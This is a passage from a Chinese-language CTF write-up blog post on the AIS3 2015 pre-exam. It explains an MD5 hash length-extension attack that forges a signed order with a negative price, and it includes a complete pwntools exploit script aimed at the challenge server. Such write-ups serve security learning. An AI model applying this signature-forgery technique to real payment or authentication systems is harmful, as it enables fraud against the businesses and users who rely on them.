那麼我就可以預測 <code class="language-plaintext highlighter-rouge">md5(a + padding + append)</code> 的值<br />
其中 <code class="language-plaintext highlighter-rouge">padding</code> 字串須透過計算來得到<br />
而 <code class="language-plaintext highlighter-rouge">append</code> 則是我們想要附加上去的字串</p>

<p>也就是說，假設今天我們知道 <code class="language-plaintext highlighter-rouge">key[:16]+"num=11111111&amp;price=10"</code> 的 md5 hash 值<br />
我們就可以預測 <code class="language-plaintext highlighter-rouge">key[:16]+"num=11111111&amp;price=10" + [padding] + "&amp;price=-1"</code> 的 md5 hash 值<br />
如此一來就可以構造假的 order information 來繞過檢查，買到 11111111 個價值 -1 塊的橘子<br />
我們的錢就可以突破 1000000 了<br />
( 注意在 checkout 時 price 的值是用 <code class="language-plaintext highlighter-rouge">info.get('price', 10)</code> 來得到的，因此 <code class="language-plaintext highlighter-rouge">...&amp;price=10abcdefg...&amp;price=-1</code>, 所拿到的值最終會是 -1 )</p>

<p>網路上也已經有工具幫我們做這件事了 – <a href="https://github.com/bwall/HashPump">HashPump</a><br />
可以直接算出 padding 和預測出來的 md5 hash 值<br />
不過這題很靠背的一點是在於 key[:16] 這行<br />
如果 key 不滿 16 字元的話就會取到該字串長度為止<br />
所以 key 不一定是 16 字元，長度有可能是 1 ~ 16 = =<br />
超級心機啊，太淫蕩惹 Orz<br />
害我一開始本地端測試 ok 之後丟到 server 那邊發現怎麼一直不 work<br />
原來就是因為這個原因…<br />
最後直接手動建了 key length = 1 ~ 16 的 payload 和 hash 值一個一個送<br />
才發現 key length = 12…</p>

<div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">itertools</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s">"52.69.163.194"</span>
<span class="c1">#HOST = "localhost"
</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">7788</span>

<span class="n">all_str</span> <span class="o">=</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">)]</span>

<span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
	<span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">pass_challenge</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"seed: "</span> <span class="o">+</span> <span class="n">seed</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">))</span>
	<span class="k">for</span> <span class="n">cnt</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">):</span>
		<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">itertools</span><span class="p">.</span><span class="n">product</span><span class="p">(</span><span class="n">all_str</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="n">cnt</span><span class="p">):</span>
			<span class="n">resp</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
			<span class="n">test</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">+</span> <span class="n">resp</span>
			<span class="k">if</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span> <span class="n">test</span> <span class="p">).</span><span class="n">hexdigest</span><span class="p">().</span><span class="n">startswith</span><span class="p">(</span><span class="s">'fffff'</span><span class="p">):</span>
				<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"found: "</span> <span class="o">+</span> <span class="n">resp</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">))</span>
				<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"verify: "</span> <span class="o">+</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">test</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">())</span>
				<span class="k">return</span> <span class="n">resp</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>

	<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="s">"num=11111111&amp;price=10</span><span class="se">\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00</span><span class="s">&amp;price=-1"</span>

	<span class="n">final_payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">"-----571297fb4b5b065155bc5a3faa2a9a3d"</span>

	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"challenge: 0x"</span><span class="p">)</span>
	<span class="n">seed</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter response: "</span><span class="p">)</span>
	<span class="n">resp</span> <span class="o">=</span> <span class="n">pass_challenge</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending resp:"</span> <span class="o">+</span> <span class="n">resp</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>

	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Input your choice: "</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"information: "</span><span class="p">)</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending payload:"</span> <span class="o">+</span> <span class="n">final_payload</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">final_payload</span><span class="p">)</span>
	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>flag: <code class="language-plaintext highlighter-rouge">AIS3{give_me_mdfive}</code></p>

<h1 id="心得">心得</h1>
<p>這次的題目大部分都出得很不錯<br />
撇開有些題目頗電波不說<br />
基本上難度還算適中<br />
不管是新的攻擊技巧還是解題思路<br />
都從這次的題目裡面學到蠻多東西的</p>

<p>最後差一題 WEB3 破台, RANK 11<br />
其實還蠻可惜的，本來最高衝到第四說<br />
主要是第二天晚上看到電視在播不可能的任務4，就放掉耍廢了XD<br />
一覺醒來直接掉到十名外，嘖嘖<br />
看到同是 BambooFox 的 <a href="http://ddaa.tw/">ddaa</a>, <a href="http://l4ys.tw/">Lays</a> 和 <a href="http://angelboy.logdown.com/">AngelBoy ( malloc )</a> 等人都在第二天相繼破台<br />
自己卻還差他們一截，就覺得自己還有許多不足的地方<br />
能夠拿來說嘴的頂多就是這次 PWN3D 是第二個 AK 的 <br />
( 第一天晚上睡覺前看到 PWN3D3 只有 2 個人解應該沒有錯 )</p>

<p>如何快速學習一個自己不知道的東西真的很重要<br />
不管是 WEB 還是其他類型的題目<br />
我發現自己還是十分缺乏快速 google + 現學現賣的能力<br />
很多時候都找不到合適的關鍵字，導致在解題時常常會卡住，而且一卡就卡很久<br />
這都是自己必須要趕快加強，改進的地方<br />
想要往更高的境界邁進，勢必得付出更多的努力才行<br />
繼續加油，努力學習吧!</p>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/write-ups/'>write-ups</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/ais3/"
            class="post-tag no-text-decoration" >AIS3</a>
          
          <a href="/tags/ctf/"
            class="post-tag no-text-decoration" >CTF</a>
          
          <a href="/tags/pwnable/"
            class="post-tag no-text-decoration" >Pwnable</a>
          
          <a href="/tags/reversing/"
            class="post-tag no-text-decoration" >Reversing</a>
          
          <a href="/tags/crypto/"
            class="post-tag no-text-decoration" >Crypto</a>
          
          <a href="/tags/web/"
            class="post-tag no-text-decoration" >Web</a>
          
          <a href="/tags/python/"
            class="post-tag no-text-decoration" >Python</a>
          
          <a href="/tags/c/"
            class="post-tag no-text-decoration" >C</a>
          
          <a href="/tags/ppc/"
            class="post-tag no-text-decoration" >PPC</a>
          
          <a href="/tags/format-string/"
            class="post-tag no-text-decoration" >format_string</a>
          
          <a href="/tags/misc/"
            class="post-tag no-text-decoration" >Misc</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=AIS3 2015 pre-exam -- complete writeup - Hacking Tube 2.0&url=http://0.0.0.0:4000/ais3-2015-pre-exam-complete-writeup/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=AIS3 2015 pre-exam -- complete writeup - Hacking Tube 2.0&u=http://0.0.0.0:4000/ais3-2015-pre-exam-complete-writeup/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://www.linkedin.com/sharing/share-offsite/?url=http://0.0.0.0:4000/ais3-2015-pre-exam-complete-writeup/" data-toggle="tooltip" data-placement="top"
          title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin">
          <i class="fa-fw fab fa-linkedin"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

    <div id="access-lastmod" class="post">
      <span>Recent Update</span>
      <ul class="post-content pl-0 pb-1 ml-1 mt-2">

      
        
        
        
        <li><a href="/Migrate-to-Github-Pages/">Migrate to Github Pages</a></li>
      
        
        
        
        <li><a href="/MeePwn-CTF-2017-Old-School/">MeePwn CTF 2017 -- Old School</a></li>
      
        
        
        
        <li><a href="/MeePwn-CTF-2017-anotherarena/">MeePwn CTF 2017 -- anotherarena</a></li>
      
        
        
        
        <li><a href="/MeePwn-CTF-2017-Brainfuck-1-2/">MeePwn CTF 2017 -- Brainfuck 1 & 2</a></li>
      
        
        
        
        <li><a href="/csaw-ctf-2014-exploitation-200-pybabbies/">CSAW CTF 2014 -- Exploitation 200 pybabbies</a></li>
      

      </ul>
    </div> <!-- #access-lastmod -->

  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag" href="/tags/python/">Python</a>
      
        
        <a class="post-tag" href="/tags/pwnable/">Pwnable</a>
      
        
        <a class="post-tag" href="/tags/ppc/">PPC</a>
      
        
        <a class="post-tag" href="/tags/heap/">heap</a>
      
        
        <a class="post-tag" href="/tags/reversing/">Reversing</a>
      
        
        <a class="post-tag" href="/tags/asis/">ASIS</a>
      
        
        <a class="post-tag" href="/tags/c/">C</a>
      
        
        <a class="post-tag" href="/tags/format-string/">format_string</a>
      
        
        <a class="post-tag" href="/tags/33c3/">33C3</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May 24, 2015
  

  <i class="unloaded">2015-05-24T06:40:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey</h3>
            <div class="text-muted small">
              <p>
                





                Category: Pwnable
Points: 2

  Wibbly Wobbly Timey Wimey
Don’t blink!
wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me:2606




32 bit ELF, with Partial RELRO, stack canary found, NX &...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/backdoorctf-2015-binary-misc/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May  8, 2015
  

  <i class="unloaded">2015-05-08T01:11:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>BackdoorCTF 2015 -- Binary + Misc</h3>
            <div class="text-muted small">
              <p>
                





                BackdoorCTF 2015
For me, this is a challenge for CTF beginners. Most of the challenges are easy to solve, although some of them require some “imagination”…

In this writeup, I’ll post the solutions...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/asis-ctf-2015-quals-saw-this-1/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May 23, 2015
  

  <i class="unloaded">2015-05-23T06:37:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>ASIS CTF 2015 Quals -- Saw this (1 & 2)</h3>
            <div class="text-muted small">
              <p>
                





                Category: pwn
Points: 100 (Saw this-1), 400 (Saw this-2)


  Survive and get the flag!
Note: This challenge contains two flags, one of them is easier to fetch, the other is harder. 
The easier flag...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/" class="btn btn-outline-primary"
    prompt="Older">
    <p>DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey</p>
  </a>
  

  
  <a href="/csaw-ctf-2015-hacking-time/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>CSAW CTF 2015 -- Hacking Time</p>
  </a>
  

</div>


    
      <!--
  The Disqus lazy loading.
  Powered by: <https://github.com/osvaldasvalutis/disqusLoader.js>
-->

<div id="disqus" class="pt-2 pb-2">
  <p class="text-center text-muted small pb-5">
    Comments powered by <a href="https://disqus.com/">Disqus</a>.
  </p>
</div>

<script src="/assets/js/lib/jquery.disqusloader.min.js"></script>
<script>
  const options = {
    scriptUrl: '//bruce30262logdown.disqus.com/embed.js',

    disqusConfig: function() {
      this.page.title = 'AIS3 2015 pre-exam -- complete writeup';
      this.page.url = 'http://0.0.0.0:4000/ais3-2015-pre-exam-complete-writeup/';
      this.page.identifier = '/ais3-2015-pre-exam-complete-writeup/';
    }
  };

  $.disqusLoader('#disqus', options);
</script>

    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2021
        <a href="https://twitter.com/bruce30262">Bruce Chen</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
